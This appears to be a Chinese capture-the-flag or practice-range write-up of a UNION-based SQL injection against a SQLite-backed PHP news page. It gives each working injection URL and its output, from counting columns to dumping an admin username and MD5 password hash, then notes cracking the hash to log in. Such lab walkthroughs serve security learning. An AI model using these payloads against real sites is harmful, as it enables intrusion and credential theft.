没用过SQLite，查看SQLite 数据库介绍，发现支持大部分通用SQL语句，故先直接使用已知的SQL语句直接查询

1. 获取SELECT 字段数
http://219.153.49.228:46485/new_list.php?id=1 order by 4  
结果：4

2. 通过UNION获取数据显示位置
http://219.153.49.228:46485/new_list.php?id=-1 union select 1,2,3,4 
结果：2 3 位置显示
3. 查询当前数据库所有表  mysql 对应information_schema.tables,SQLite 对应 sqlite_master
http://219.153.49.228:46485/new_list.php?id=-1 union select 1,2,(SELECT group_concat(tbl_name) FROM sqlite_master ),4 
结果：WSTMart_reg,sqlite_sequence,notice_sybase


4. 查询指定表的字段名  SQLite 中本人暂时没找到像information_schema.columns的表，但是SQLite可以查看表结构的SQL语句，可从此处获取字段

http://219.153.49.228:46485/new_list.php?id=-1 union select 1,2,(select group_concat(sql) from sqlite_master where tbl_name = 'WSTMart_reg' ),4 

结果：CREATE TABLE WSTMart_reg( 
    id integer primary key autoincrement, 
    name varchar(20) not null, 
    password varchar(40) not null, 
    status int not null )

5. 获取字段对应的内

http://219.153.49.228:46485/new_list.php?id=-1 union select 1,2,         (select group_concat(name,password) from WSTMart_reg ),4  
 结果：mozhe 0508f345a096b0a65ee832b4adaa0315 mozhe


6. MD5解密，登录后台，获取KEY